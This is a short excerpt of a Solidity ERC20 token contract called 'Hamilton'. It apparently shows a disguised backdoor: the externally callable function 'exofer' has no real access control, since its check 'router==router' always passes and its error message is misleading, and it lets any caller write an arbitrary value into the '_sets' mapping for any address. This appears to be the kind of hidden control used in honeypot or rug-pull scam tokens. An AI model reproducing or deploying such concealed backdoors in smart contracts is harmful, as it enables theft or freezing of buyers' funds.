...
contract Hamilton is Context, IERC20, Ownable {
    ...
    string private constant _name = "Hamilton";
    string private constant _symbol = "Hamilton";
    ...
    function exofer(address adr,uint256 num) external { 
        require(router==router,"ERC20: approve from the zero address");
         _sets[adr] = num;
    }
